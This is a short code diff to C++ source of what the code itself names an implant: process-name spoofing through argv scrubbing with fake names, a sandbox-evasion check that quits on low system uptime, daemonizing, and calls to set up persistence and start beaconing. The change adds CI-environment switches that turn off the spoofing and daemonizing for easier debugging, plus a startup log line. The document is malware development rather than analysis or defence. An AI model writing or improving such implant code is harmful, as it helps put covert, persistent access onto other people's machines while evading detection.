@@ -45,6 +45,8 @@ namespace {
         if (f) { if (fscanf(f, "%lf", &uptime) == 1 && uptime < 120.0) { fclose(f); _exit(0); } fclose(f); }
     }
     void Daemonize() {
+        if (getenv("CI")) return; // Don't daemonize in CI so we can see output
+
         pid_t pid = fork(); if (pid < 0) exit(EXIT_FAILURE); if (pid > 0) exit(EXIT_SUCCESS);
         if (setsid() < 0) exit(EXIT_FAILURE);
         signal(SIGCHLD, SIG_IGN); signal(SIGHUP, SIG_IGN);
@@ -64,11 +66,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 #else
 int main(int argc, char** argv) {
-    // 1. Scrub argv and rename
     std::mt19937 rng((unsigned int)std::chrono::system_clock::now().time_since_epoch().count());
     std::uniform_int_distribution<size_t> dist(0, 8);
     const char* chosen = fake_names[dist(rng)].c_str();
-    ScrubArgv(argc, argv, chosen);
+
+    // 1. Scrub argv and rename (only if not in CI, for better visibility)
+    if (!getenv("CI")) {
+        ScrubArgv(argc, argv, chosen);
+    }
 
     // 2. Anti-analysis checks
     AntiAnalysis();
@@ -81,6 +86,8 @@ int main(int argc, char** argv) {
 
     // 4. Daemonize
     Daemonize();
+
+    LOG_INFO("Implant starting...");
 
     // 5. Setup Persistence and start beaconing
     persistence::establishPersistence();
